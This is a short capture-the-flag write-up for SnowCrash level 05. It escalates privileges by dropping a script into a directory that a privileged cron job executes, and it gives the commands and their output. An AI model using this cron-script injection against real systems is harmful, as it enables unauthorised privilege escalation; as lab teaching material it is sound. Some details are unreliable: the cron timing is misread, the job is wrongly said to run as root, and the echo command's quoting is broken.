# LEVEL 05

## Vulnerability & exploit

Cron job running undefined scripts as privileged user -> Privilege escalation via cron

## Initial Context

Upon logging, we are informed that we have a mail:

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

## Solving the challenge

User flag05 seems to inform us that he set up a cron job to run every 30 seconds (which should round to 1min), during the following script is run as root:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We can see that it will loop through all the files in /opt/openarenaserver and run them in a bash shell.  
We therefore need to create a bash script in that directory, to have it run as root.
Since the operaneserver script does not return or print the output of the command, we will have to make sure the output is redirected to a file in /tmp.

```
level05@SnowCrash:~$ echo `getflag` > /tmp/token' > /tmp/getflag.sh
level05@SnowCrash:~$ mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```
